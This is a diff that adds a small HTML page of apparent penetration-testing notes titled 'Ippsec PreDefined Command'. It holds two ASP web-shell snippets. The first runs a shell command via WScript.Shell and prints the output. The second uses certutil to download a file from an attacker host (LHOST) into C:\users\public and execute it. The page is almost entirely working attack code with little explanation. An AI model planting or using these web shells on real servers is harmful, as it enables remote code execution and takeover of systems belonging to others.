@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ippsec PreDefined Command</title>
+</head><body>## Need to put in the command you want executed in rs.Exec("whoami")<br/>
+<br/>
+&lt;%<br/>
+Set rs = CreateObject("WScript.Shell")<br/>
+Set cmd = rs.Exec("")<br/>
+o = cmd.StdOut.Readall()<br/>
+Response.write(o)<br/>
+%&gt;<br/>
+<br/>
+<br/>
+<br/>
+## We can use certutil or other to download files and then execute them<br/>
+<br/>
+&lt;%<br/>
+Set rs = CreateObject("WScript.Shell")<br/>
+Set cmd = rs.Exec("certutil -urlcache -split -f http://&lt;LHOST&gt;/&lt;file&gt; C:\users\public\&lt;file&gt; &amp; cmd /c C:\users\public\&lt;file&gt;")<br/>
+o = cmd.StdOut.Readall()<br/>
+Response.write(o)<br/>
+%&gt;</body></html>
